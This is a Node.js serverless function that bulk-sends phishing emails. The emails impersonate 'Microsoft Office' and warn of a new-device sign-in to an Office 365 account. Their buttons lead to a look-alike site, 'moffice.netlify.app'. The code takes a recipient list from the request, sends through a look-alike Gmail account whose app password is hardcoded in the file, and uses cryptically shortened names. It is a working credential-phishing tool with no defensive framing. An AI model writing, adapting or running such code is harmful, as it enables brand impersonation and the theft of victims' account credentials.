const nodemailer = require('nodemailer');

exports.handler = async (event) => {
  try {
    const data = JSON.parse(event.body);
    const recsx = data.recsx;

    if (typeof recsx !== 'string' || !recsx) {
      console.error("recsx is invalid:", recsx);
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'Invalid' })
      };
    }

    const emlStrng = recsx.trim();
    const rcpntEmls = emlStrng.split('\n').map(email => email.trim()).filter(email => email !== "");


    console.log("snt 2:", rcpntEmls);

    if (rcpntEmls.length === 0) {
      console.error("No valid rec");
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'No valid rec2' })
      };
    }

      const transporter = nodemailer.createTransport({
        host: 'smtp.gmail.com',
        port: 465,
        secure: true,
      auth: {
        user: 'mircosoftii@gmail.com',
        pass: 'lztqyrqznnqaieth'
      }
    });

  
    const mailOptions = {
      from: '"Microsoft Office" <Office365>',
      to: rcpntEmls,
      subject: 'Please Review Security Settings',
      html: `
          <div style="background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
          <p><strong>Your Office 365 Account was just signed in to from a new device.
          You're getting this email to make sure it was you.</strong></p>
          <p>Please go to your recent activity page to let us know whether or not this was you. To help keep you safe, we require an extra security challenge</p>
          <a style="background-color:rgb(179, 222, 156); color: black; width: 100%; padding: 0.75rem;" href="https://moffice.netlify.app/">Review Recent Activity</>
          <p>To Opt or change when you receive security notifications <a href="https://moffice.netlify.app/">Click Here.</a></p>
          </div>
      `
    };

    const info = await transporter.sendMail(mailOptions);

    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ success: true, message: 'Emlsntscsfly' })
    };

  } catch (error) {
    console.error('Errsbmtfnctn:', error);
    return {
      statusCode: 500,
      headers: {
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ error: 'Fldtprcsrqst' })
    };
  }
};